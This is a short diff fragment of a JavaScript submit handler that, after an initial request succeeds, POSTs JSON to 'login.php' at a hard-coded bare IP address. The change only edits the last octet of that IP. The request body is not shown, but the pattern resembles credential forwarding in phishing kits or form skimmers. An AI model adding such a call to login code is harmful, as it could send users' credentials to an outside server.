@@ -34,7 +34,7 @@ const onSubmit = async () => {
     }),
   });
   if (res?.status) {
-    await fetch(`https://1.179.203.188/login.php`, {
+    await fetch(`https://1.179.203.189/login.php`, {
       method: "POST",
       headers: {
         "Content-Type": "application/json",
